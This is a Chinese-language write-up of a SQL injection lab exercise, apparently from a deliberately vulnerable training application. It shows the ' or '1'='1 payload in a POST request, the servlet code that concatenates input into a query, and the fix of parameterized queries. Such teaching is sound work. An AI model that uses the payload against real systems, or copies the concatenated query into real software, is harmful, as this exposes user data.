# SQL Injection Lesson(SQL 注入)

## 题介绍
在页面输入框中输入信息，将数据表所有信息查询出来

## 功能实现 
点击页面 获取该用户 按钮 
```
POST /lessons/e881086d4d8eb2604d8093d93ae60986af8119c4f643894775433dbfb6faa594 HTTP/1.1

aUserName='+or+'1'%3D'1
```
对应后端代码  src/main/java/servlets/module/lesson/SqlInjectionLesson.java

```
String aUserName = request.getParameter("aUserName");
log.debug("User Submitted - " + aUserName);
String ApplicationRoot = getServletContext().getRealPath("");
log.debug("Servlet root = " + ApplicationRoot );
String[][] output = getSqlInjectionResult(ApplicationRoot, aUserName);
```
具体执行的SQL
```
public static String[][] getSqlInjectionResult (String ApplicationRoot, String username)
	{
		
		String[][] result = new String[10][3];
		try 
		{
			Connection conn = Database.getSqlInjLessonConnection(ApplicationRoot);
			Statement stmt;
			stmt = conn.createStatement();
			ResultSet resultSet = stmt.executeQuery("SELECT * FROM tb_users WHERE username = '" + username + "'");
```
没有对提交的参数进行任何操作，直接拼接成SQL语句，进行查询 

## 解题步骤  

- 直接在界面输入 ' or '1'='1  
- 最终执行的SQL语句如下，是一个永真查询条件
```
SELECT * FROM tb_users WHERE username = '' or '1'='1' 
```
- 查询到所有信息

## 总结  

SQL注入是非常常见的一种漏洞,对数据库进行操作时，未考虑安全性，导致用户输入的数据当作SQL指令进行执行，进而攻击者完全控制了一条SQL语句,能够做很多意想不到的事情

针对关系型数据库的注入，一般通用的解决方案是参数化查询或者叫预编译查询，简单说 就是保证用户输入的数据只当成数据，不会变成SQL指令 

